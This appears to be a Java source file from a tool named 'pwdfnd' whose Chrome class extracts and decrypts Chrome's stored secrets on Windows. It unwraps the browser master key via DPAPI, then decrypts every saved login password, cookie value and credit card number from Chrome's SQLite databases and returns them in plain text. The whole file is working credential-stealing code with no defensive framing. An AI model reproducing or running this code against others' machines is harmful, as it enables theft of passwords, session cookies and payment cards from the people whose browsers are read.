package pwdfnd;

import com.sun.jna.platform.win32.Crypt32Util;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONException;
import org.json.JSONObject;

public class Chrome {
	public static byte[] GetMasterKeyChrome(String pathLocalState) throws JSONException, IOException {
		JSONObject jsonObjectLocalState = new JSONObject(
				Files.readAllLines(Paths.get(pathLocalState, new String[0])).get(0));
		String encryptedMasterKeyWithPrefixB64 = jsonObjectLocalState.getJSONObject("os_crypt")
				.getString("encrypted_key");
		byte[] encryptedMasterKeyWithPrefix = Base64.getDecoder().decode(encryptedMasterKeyWithPrefixB64);
		byte[] encryptedMasterKey = Arrays.copyOfRange(encryptedMasterKeyWithPrefix, 5,
				encryptedMasterKeyWithPrefix.length);
		byte[] masterKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey);
		return masterKey;
	}

	public static String DecryptWithMasterkey(byte[] todecrypt, byte[] masterkey)
			throws NoSuchAlgorithmException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException,
			InvalidKeyException, InvalidAlgorithmParameterException {

		byte[] mybyte = todecrypt;
		byte[] nonce = Arrays.copyOfRange(mybyte, 3, 15);
		byte[] ciphertextTag = Arrays.copyOfRange(mybyte, 15, mybyte.length);
		Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
		GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, nonce);
		SecretKeySpec keySpec = new SecretKeySpec(masterkey, "AES");
		cipher.init(2, keySpec, gcmParameterSpec);
		byte[] passbyte = cipher.doFinal(ciphertextTag);

		return new String(passbyte);

	}

	public static List<HashMap<String, String>> GetAllPasswords(String ChromeUserDataDir) throws Exception {
		byte[] masterkey = GetMasterKeyChrome(String.valueOf(ChromeUserDataDir) + "/Local State");
		String path_to_db = String.valueOf(ChromeUserDataDir) + "/Default/Login Data";
		Connection connection = null;
		connection = DriverManager.getConnection("jdbc:sqlite:" + path_to_db);
		PreparedStatement statement = connection
				.prepareStatement("SELECT `origin_url`,`username_value`,`password_value` from `logins`");
		ResultSet re = statement.executeQuery();
		LinkedList<HashMap<String, String>> returnlist = new LinkedList<>();
		while (re.next()) {
			HashMap<String, String> map = new HashMap<>();

			String pass = DecryptWithMasterkey(re.getBytes("password_value"), masterkey);

			String origin = re.getString("origin_url");
			String username = re.getString("username_value");
			map.put("origin", origin);
			map.put("username", username);
			map.put("password", pass);
			returnlist.addLast(map);
		}
		connection.close();

		return returnlist;
	}

	public static List<HashMap<String, String>> GetAllCookies(String ChromeUserDataDir) throws Exception {
		byte[] masterkey = GetMasterKeyChrome(String.valueOf(ChromeUserDataDir) + "/Local State");
		String path_to_db = String.valueOf(ChromeUserDataDir) + "/Default/Cookies";
		Connection connection = null;
		connection = DriverManager.getConnection("jdbc:sqlite:" + path_to_db);
		PreparedStatement statement = connection.prepareStatement("SELECT * from `cookies`");
		ResultSet re = statement.executeQuery();
		LinkedList<HashMap<String, String>> returnlist = new LinkedList<>();
		while (re.next()) {
			HashMap<String, String> map = new HashMap<>();

			String decrypted_value = DecryptWithMasterkey(re.getBytes("encrypted_value"), masterkey);

			String host_key = null;
			String name = null;
			String value = null;
			String path = null;
			int expires_utc = 0;
			int creation_utc = 0;
			int is_secure = 0;
			int is_httponly = 0;
			int last_access_utc = 0;
			int has_expires = 0;
			int is_persistent = 0;
			int priority = 0;
			int samesite = 0;
			int source_scheme = 0;
			int source_port = 0;
			int is_same_party = 0;

			try {
				host_key = re.getString("host_key");
				name = re.getString("name");
				value = re.getString("value");
				path = re.getString("path");
				expires_utc = re.getInt("expires_utc");
				creation_utc = re.getInt("creation_utc");
				is_secure = re.getInt("is_secure");
				is_httponly = re.getInt("is_httponly");
				last_access_utc = re.getInt("last_access_utc");
				has_expires = re.getInt("has_expires");
				is_persistent = re.getInt("is_persistent");
				priority = re.getInt("priority");
				samesite = re.getInt("samesite");
				source_scheme = re.getInt("source_scheme");
				source_port = re.getInt("source_port");
				is_same_party = re.getInt("is_same_party");
			} catch (Exception ex) {

			}

			map.put("decrypted_value", decrypted_value);

			map.put("host_key", host_key);
			map.put("name", name);
			map.put("value", value);
			map.put("path", path);
			map.put("expires_utc", String.valueOf(expires_utc));
			map.put("creation_utc", String.valueOf(creation_utc));
			map.put("is_secure", String.valueOf(is_secure));
			map.put("is_httponly", String.valueOf(is_httponly));
			map.put("last_access_utc", String.valueOf(last_access_utc));
			map.put("has_expires", String.valueOf(has_expires));
			map.put("is_persistent", String.valueOf(is_persistent));
			map.put("priority", String.valueOf(priority));
			map.put("samesite", String.valueOf(samesite));
			map.put("source_scheme", String.valueOf(source_scheme));
			map.put("source_port", String.valueOf(source_port));
			map.put("is_same_party", String.valueOf(is_same_party));

			returnlist.addLast(map);
		}
		connection.close();

		return returnlist;
	}
	
	
	public static List<HashMap<String, String>> GetAllCreditcard(String ChromeUserDataDir) throws Exception {
		byte[] masterkey = GetMasterKeyChrome(String.valueOf(ChromeUserDataDir) + "/Local State");
		String path_to_db = String.valueOf(ChromeUserDataDir) + "/Default/Web Data";
		Connection connection = null;
		connection = DriverManager.getConnection("jdbc:sqlite:" + path_to_db);
		PreparedStatement statement = connection.prepareStatement("SELECT * from `credit_cards`");
		ResultSet re = statement.executeQuery();
		LinkedList<HashMap<String, String>> returnlist = new LinkedList<>();
		while (re.next()) {
			HashMap<String, String> map = new HashMap<>();

			String card_number = DecryptWithMasterkey(re.getBytes("card_number_encrypted"), masterkey);

			String name_on_card = re.getString("name_on_card");
			String nickname = re.getString("nickname");
			int expiration_month = re.getInt("expiration_month");
			int expiration_year = re.getInt("expiration_year");;
			
			map.put("name_on_card", name_on_card);
			map.put("nickname", nickname);
			map.put("card_number", card_number);
			map.put("expiration_month", String.valueOf(expiration_month));
			map.put("expiration_year", String.valueOf(expiration_year));

			returnlist.addLast(map);
			
		}
		connection.close();

		return returnlist;
	}
}
